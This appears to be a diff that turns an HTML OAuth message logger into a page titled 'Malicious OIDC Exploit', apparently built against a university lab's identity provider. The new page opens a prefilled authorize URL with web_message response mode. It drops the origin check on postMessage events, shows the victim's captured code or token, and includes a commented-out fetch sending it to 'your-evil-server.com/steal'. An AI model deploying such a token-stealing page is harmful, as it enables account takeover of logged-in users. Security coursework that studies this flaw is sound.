@@ -2,108 +2,74 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Iframe OAuth Logger</title>
-  
+  <title>Malicious OIDC Exploit</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 1rem;
-      padding: 0;
-      background: #f4f4f4;
-    }
-    h1, h2 {
-      color: #333;
-    }
-    button {
-      margin-bottom: 1rem;
-    }
-    iframe {
-      display: block;
-      margin: 1rem 0;
+    body { font-family: Arial, sans-serif; margin: 1em; }
+    #tokenLog {
+      margin-top: 1em; 
+      padding: 1em; 
+      background: #f0f0f0; 
       border: 1px solid #ccc;
-    }
-    #logs {
       white-space: pre-wrap;
-      background: #fff;
-      padding: 1rem;
-      border: 1px solid #ccc;
-      overflow-x: auto;
     }
   </style>
 </head>
 <body>
-  <h1>Iframe OAuth Logger</h1>
-  <button id="open-iframe-btn">Open Login Iframe</button>
-  <button id="clear-logs-btn">Clear Logs</button>
+  <h1>Malicious OIDC Exploit</h1>
+  <p>
+    When the victim clicks below, we will open the IdP’s vulnerable login flow.  
+    Because the victim is already authenticated, the IdP will immediately post the token back to us.
+  </p>
+  <button id="stealTokenBtn">Steal the Victim’s Token</button>
 
-  <h2>Logs</h2>
-  <div id="logs">(No logs yet)</div>
+  <h2>Captured Token/Response:</h2>
+  <div id="tokenLog">(none yet)</div>
 
   <script>
-    // We'll store messages in an array and persist them in localStorage
-    let iframeLogs = [];
+    // Replace this URL with the EXACT one from the vulnerable flow (spa-v5).
+    // Make sure you do NOT remove or alter any required parameters like idp_verifier, sp_verifier, sp_id, etc.
+    const authorizeUrl = 
+      "https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml" +
+      "?scope=profile+email+calendar+passwords+photos" +
+      "&response_type=code" +
+      "&redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%2Foidc_sp%2Fspa%2Fverify" +
+      "&state=WOPDynAm0wC8G4VOXNC9Rg" +
+      "&code_challenge_method=S256" +
+      "&client_id=spa-1" +
+      "&code_challenge=X351ZmJZrSLWgosjLBv6IM2cvqI5TjvsfbAFZ5qI3v8" +
+      "&response_mode=web_message" +
+      "&idp_verifier=spa-s1";
 
-    // Load logs from localStorage on page load
-    document.addEventListener("DOMContentLoaded", () => {
-      const savedLogs = localStorage.getItem("iframeLogs");
-      if (savedLogs) {
-        iframeLogs = JSON.parse(savedLogs);
-      }
-      displayLogs();
+    // When victim clicks the button, open the IdP in a new window.
+    document.getElementById("stealTokenBtn").addEventListener("click", () => {
+      window.open(authorizeUrl, "_blank", "width=800,height=600");
     });
 
-    // Function to display logs in the #logs <div>
-    function displayLogs() {
-      const logsDiv = document.getElementById("logs");
-      if (iframeLogs.length === 0) {
-        logsDiv.textContent = "(No logs yet)";
-      } else {
-        logsDiv.textContent = JSON.stringify(iframeLogs, null, 2);
-      }
-    }
+    // Listen for any postMessage events from that new window (the IdP).
+    window.addEventListener("message", function (event) {
+      // NOTE: If the IdP is truly vulnerable, it may postMessage to us with no further checks.
+      // If there is some domain check, you might have to adjust or remove the check below.
+      console.log("Got a postMessage event:", event);
 
-    // Create an iframe pointing to the given URL
-    function openIframe() {
-      // In case we open multiple times, you might want to remove
-      // the existing iframe first or handle it differently
-      let iframe = document.createElement("iframe");
-      iframe.width = "600";
-      iframe.height = "400";
-      iframe.src =
-        "https://idp-elearning.cloud.nds.rub.de/oidc_idp/authorize/index.xhtml?scope=profile+email+calendar+passwords+photos&response_type=code&redirect_uri=https%3A%2F%2Fsp-elearning.cloud.nds.rub.de%3A443%2Foidc_sp%2Fspa%2Fverify&state=WOPDynAm0wC8G4VOXNC9Rg&code_challenge_method=S256&client_id=spa-1&code_challenge=X351ZmJZrSLWgosjLBv6IM2cvqI5TjvsfbAFZ5qI3v8&response_mode=web_message&idp_verifier=spa-s1";
-      document.body.appendChild(iframe);
-    }
+      // For debugging: log the origin to see who is sending the message
+      // console.log("Message origin: ", event.origin);
 
-    // Listen for message events from the iframe
-    window.addEventListener("message", (event) => {
-      // Verify origin for security; adjust if needed
-      if (event.origin !== "https://sp-elearning.cloud.nds.rub.de") {
-        console.warn("Ignoring message from unknown origin:", event.origin);
-        return;
-      }
+      // If you expect the message to come from the IdP domain, you could check it:
+      // if (event.origin !== "https://idp-elearning.cloud.nds.rub.de") {
+      //   return; 
+      // }
 
-      // Push new data to logs
-      console.log("Message received from iframe:", event.data);
-      iframeLogs.push(event.data);
-      
-      // Save logs to localStorage
-      localStorage.setItem("iframeLogs", JSON.stringify(iframeLogs));
-      
-      // Update UI
-      displayLogs();
+      // The IdP might post an object with { access_token: "...", ... } or just the OAuth code.
+      const tokenLogDiv = document.getElementById("tokenLog");
+      tokenLogDiv.textContent = "Received message:\n" + JSON.stringify(event.data, null, 2);
+
+      // Exfiltrate the token (or code) to your server:
+      // fetch("https://your-evil-server.com/steal", {
+      //   method: "POST",
+      //   headers: { "Content-Type": "application/json" },
+      //   body: JSON.stringify(event.data)
+      // });
     });
-
-    // Clear logs both from memory and localStorage
-    function clearLogs() {
-      iframeLogs = [];
-      localStorage.removeItem("iframeLogs");
-      displayLogs();
-    }
-
-    // Bind events to buttons
-    document.getElementById("open-iframe-btn").addEventListener("click", openIframe);
-    document.getElementById("clear-logs-btn").addEventListener("click", clearLogs);
   </script>
 </body>
 </html>
